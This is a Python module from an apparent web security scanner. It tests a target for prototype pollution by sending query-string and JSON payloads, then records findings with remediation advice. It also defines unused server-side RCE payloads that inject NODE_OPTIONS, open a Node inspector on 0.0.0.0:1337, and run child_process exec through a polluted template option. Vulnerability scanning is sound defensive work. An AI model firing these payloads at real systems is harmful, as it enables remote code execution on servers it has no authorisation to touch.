"""Prototype pollution scanner — client-side and server-side."""
from __future__ import annotations
import asyncio
import urllib.parse
from typing import Any
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)

PP_DETECTION_PAYLOADS = [
    ("__proto__[talisman]=polluted",   "URL query __proto__"),
    ("constructor.prototype.talisman=polluted", "constructor.prototype"),
    ("__proto__.talisman=polluted",    "dot notation"),
]

PP_JSON_PAYLOADS = [
    '{"__proto__": {"talisman": "polluted"}}',
    '{"constructor": {"prototype": {"talisman": "polluted"}}}',
]

PP_RESPONSE_INDICATORS = [
    "polluted", "talisman", "prototype", "__proto__",
    "TypeError", "Cannot read properties",
]

PP_SERVER_RCE_PAYLOADS = [
    '{"__proto__": {"shell": "node", "NODE_OPTIONS": "--require /proc/self/environ"}}',
    '{"__proto__": {"argv0": "node", "shell": "node", "NODE_OPTIONS": "--inspect=0.0.0.0:1337"}}',
    '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\'child_process\').exec(\'id\')"}}',
]


async def _test_query_pollution(url: str, client: TalismanHTTPClient) -> dict[str, Any] | None:
    parsed = urllib.parse.urlparse(url)
    for payload_str, desc in PP_DETECTION_PAYLOADS:
        test_url = f"{url}{'&' if parsed.query else '?'}{payload_str}"
        try:
            r = await client.get(test_url, timeout=10)
            for indicator in PP_RESPONSE_INDICATORS:
                if indicator in r.text:
                    return {"technique": "query_param", "payload": payload_str,
                            "desc": desc, "evidence": r.text[:200],
                            "request": f"GET {test_url} HTTP/1.1"}
        except Exception:
            pass
    return None


async def _test_json_pollution(url: str, client: TalismanHTTPClient) -> dict[str, Any] | None:
    for payload in PP_JSON_PAYLOADS:
        try:
            r = await client.post(
                url, content=payload,
                headers={"Content-Type": "application/json"}, timeout=10
            )
            for indicator in PP_RESPONSE_INDICATORS:
                if indicator in r.text:
                    return {"technique": "json_body", "payload": payload,
                            "evidence": r.text[:200],
                            "request": f"POST {url} HTTP/1.1\nContent-Type: application/json\n\n{payload}"}
        except Exception:
            pass
    return None


async def run(
    target: str,
    session: Any = None,
    scope: Any = None,
    rate_limiter: Any = None,
    proxy: str | None = None,
    **kwargs: Any,
) -> dict[str, Any]:
    url = target if "://" in target else f"https://{target}"
    console.print(f"\n[module] Prototype Pollution Scanner[/module] → [target]{url}[/target]")
    findings: list[dict[str, Any]] = []

    async with TalismanHTTPClient(proxy=proxy, timeout=12) as client:
        tasks = [
            _test_query_pollution(url, client),
            _test_json_pollution(url, client),
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for result in results:
            if isinstance(result, dict):
                severity = "high"
                title = f"Prototype pollution — {result['technique']}"
                print_finding(title, severity, url)
                findings.append(result)
                if session:
                    await session.add_finding(
                        target=url, module="prototype_pollution",
                        vuln_type="prototype_pollution",
                        severity=severity, confidence="confirmed",
                        title=title,
                        description=(
                            f"Prototype pollution via {result['technique']}. "
                            f"Injected property 'talisman' reflected or caused an error, "
                            "indicating the application merges user input into objects without sanitization."
                        ),
                        request=result.get("request", ""),
                        evidence=result.get("evidence", ""),
                        reproduction=f"Send: {result.get('payload', '')}",
                        remediation=(
                            "1. Use Object.create(null) for maps that take user input.\n"
                            "2. Validate keys against a denylist (__proto__, constructor, prototype).\n"
                            "3. Use JSON schema validation.\n"
                            "4. Prefer lodash.merge 4.17.21+ which patches PP."
                        ),
                        cvss_score=8.1, cwe="CWE-915",
                    )

    console.print(f"  Found {len(findings)} prototype pollution vectors")
    return {"target": url, "findings": findings, "count": len(findings)}
